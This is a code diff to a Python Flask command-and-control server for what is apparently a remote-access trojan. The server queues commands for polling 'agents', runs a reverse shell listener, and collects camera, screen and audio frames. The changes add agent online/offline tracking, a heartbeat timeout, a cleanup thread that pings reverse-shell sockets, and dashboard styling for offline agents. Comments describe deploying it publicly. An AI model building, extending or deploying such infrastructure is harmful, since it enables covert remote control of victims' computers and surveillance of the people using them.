@@ -233,6 +233,17 @@ DASHBOARD_HTML = """
             box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
         }
 
+        .agent-card.offline {
+            opacity: 0.6;
+            background: rgba(128, 128, 128, 0.1);
+            border-color: #666;
+        }
+
+        .agent-card.offline:hover {
+            border-color: #888;
+            box-shadow: 0 4px 20px rgba(128, 128, 128, 0.2);
+        }
+
         .agent-status {
             position: absolute;
             top: 10px;
@@ -243,6 +254,18 @@ DASHBOARD_HTML = """
             background: var(--accent-green);
             box-shadow: 0 0 10px var(--accent-green);
             animation: pulse 2s infinite;
+        }
+
+        .agent-status.active {
+            background: var(--accent-green);
+            box-shadow: 0 0 10px var(--accent-green);
+            animation: pulse 2s infinite;
+        }
+
+        .agent-status.offline {
+            background: #666;
+            box-shadow: 0 0 5px #666;
+            animation: none;
         }
 
         @keyframes pulse {
@@ -992,11 +1015,23 @@ DASHBOARD_HTML = """
                     agentCard.onclick = () => selectAgent(agentCard, agentId);
                     
                     const lastSeen = agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never';
+                    const status = agent.status || 'offline';
+                    const statusIcon = status === 'active' ? '🟢' : '🔴';
+                    const statusText = status === 'active' ? 'Online' : 'Offline';
+                    
                     agentCard.innerHTML = `
-                        <div class="agent-status"></div>
+                        <div class="agent-status ${status}"></div>
                         <div class="agent-id">${agentId.substring(0, 8)}...</div>
-                        <div class="agent-info">Last seen: ${lastSeen}</div>
+                        <div class="agent-info">
+                            <div>${statusIcon} ${statusText}</div>
+                            <div style="font-size: 0.8rem;">Last seen: ${lastSeen}</div>
+                        </div>
                     `;
+                    
+                    // Add status-specific styling
+                    if (status === 'offline') {
+                        agentCard.classList.add('offline');
+                    }
                     
                     if (agentId === selectedAgentId) {
                         agentCard.classList.add('selected');
@@ -1544,7 +1579,7 @@ DASHBOARD_HTML = """
 """
 
 # In-memory storage for multi-agent support.
-AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": None})
+AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": None, "status": "offline"})
 
 VIDEO_FRAMES = defaultdict(lambda: None)
 CAMERA_FRAMES = defaultdict(lambda: None)
@@ -1557,6 +1592,96 @@ VOICE_COMMANDS = defaultdict(lambda: queue.Queue())
 REVERSE_SHELL_CONNECTIONS = {}
 REVERSE_SHELL_SERVER = None
 REVERSE_SHELL_THREAD = None
+
+# Agent heartbeat monitoring
+AGENT_TIMEOUT_SECONDS = 60  # Consider agent offline after 60 seconds of no contact
+CLEANUP_INTERVAL_SECONDS = 30  # Check for stale connections every 30 seconds
+
+# --- Agent Status Management Functions ---
+
+def update_agent_statuses():
+    """Update agent status based on connection state and last seen time."""
+    current_time = datetime.datetime.utcnow()
+    
+    for agent_id, agent_data in AGENTS_DATA.items():
+        # Check if agent has an active reverse shell connection
+        has_active_connection = agent_id in REVERSE_SHELL_CONNECTIONS
+        
+        # Check if agent has been seen recently
+        last_seen_time = None
+        if agent_data["last_seen"]:
+            try:
+                # Parse ISO format with Z suffix
+                last_seen_str = agent_data["last_seen"].rstrip('Z')
+                last_seen_time = datetime.datetime.fromisoformat(last_seen_str)
+            except ValueError:
+                # Fallback for different date formats
+                last_seen_time = None
+        
+        # Determine status based on connection and last seen time
+        if has_active_connection and last_seen_time:
+            time_diff = (current_time - last_seen_time).total_seconds()
+            if time_diff <= AGENT_TIMEOUT_SECONDS:
+                agent_data["status"] = "active"
+            else:
+                agent_data["status"] = "offline"
+        elif has_active_connection:
+            # Has connection but no recent heartbeat
+            agent_data["status"] = "offline"
+        elif last_seen_time:
+            # No connection but has been seen before
+            time_diff = (current_time - last_seen_time).total_seconds()
+            if time_diff <= AGENT_TIMEOUT_SECONDS:
+                agent_data["status"] = "offline"  # No connection = offline
+            else:
+                agent_data["status"] = "offline"
+        else:
+            # Never seen before
+            agent_data["status"] = "offline"
+
+def cleanup_stale_connections():
+    """Remove stale connections and update agent statuses."""
+    current_time = datetime.datetime.utcnow()
+    stale_connections = []
+    
+    # Check for stale reverse shell connections
+    for agent_id, conn_info in list(REVERSE_SHELL_CONNECTIONS.items()):
+        try:
+            # Try to send a small test message to check if connection is alive
+            socket_conn = conn_info["socket"]
+            socket_conn.settimeout(1)  # 1 second timeout
+            socket_conn.send(b"ping\n")
+        except Exception:
+            # Connection is dead, mark for removal
+            stale_connections.append(agent_id)
+    
+    # Remove stale connections
+    for agent_id in stale_connections:
+        if agent_id in REVERSE_SHELL_CONNECTIONS:
+            try:
+                REVERSE_SHELL_CONNECTIONS[agent_id]["socket"].close()
+            except:
+                pass
+            del REVERSE_SHELL_CONNECTIONS[agent_id]
+            print(f"Removed stale reverse shell connection for agent {agent_id}")
+    
+    # Update all agent statuses
+    update_agent_statuses()
+
+def start_cleanup_thread():
+    """Start a background thread for periodic cleanup of stale connections."""
+    def cleanup_worker():
+        while True:
+            try:
+                cleanup_stale_connections()
+                time.sleep(CLEANUP_INTERVAL_SECONDS)
+            except Exception as e:
+                print(f"Error in cleanup thread: {e}")
+                time.sleep(CLEANUP_INTERVAL_SECONDS)
+    
+    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
+    cleanup_thread.start()
+    print("Started agent cleanup thread")
 
 # --- Reverse Shell Server Functions ---
 
@@ -1822,9 +1947,18 @@ def stream_audio():
 @app.route("/agents", methods=["GET"])
 def get_agents():
     """
-    Lists all agents that have checked in and their last seen time.
+    Lists all agents that have checked in, including both active and offline agents.
+    Updates agent status based on connection state and last seen time.
     """
-    return jsonify(AGENTS_DATA)
+    # Update agent statuses before returning
+    update_agent_statuses()
+    
+    # Return all agents with their current status
+    agents_with_status = {}
+    for agent_id, agent_data in AGENTS_DATA.items():
+        agents_with_status[agent_id] = dict(agent_data)
+    
+    return jsonify(agents_with_status)
 
 # --- File Management Endpoints ---
 
@@ -2059,8 +2193,14 @@ def get_task(agent_id):
     """
     Called by an agent to get its next command.
     """
-    # This serves as a heartbeat, updating the last_seen time.
+    # This serves as a heartbeat, updating the last_seen time and status.
     AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
+    
+    # Update status based on current connection state
+    if agent_id in REVERSE_SHELL_CONNECTIONS:
+        AGENTS_DATA[agent_id]["status"] = "active"
+    else:
+        AGENTS_DATA[agent_id]["status"] = "offline"
 
     commands = AGENTS_DATA[agent_id]["commands"]
     if commands:
@@ -2088,6 +2228,10 @@ if __name__ == "__main__":
     # Start the reverse shell server
     print("Starting reverse shell server...")
     start_reverse_shell_server()
+    
+    # Start the agent cleanup thread
+    print("Starting agent monitoring...")
+    start_cleanup_thread()
     
     # For deployment on services like Render or Railway, they will use a production WSGI server.
     # The host '0.0.0.0' makes the server accessible externally.
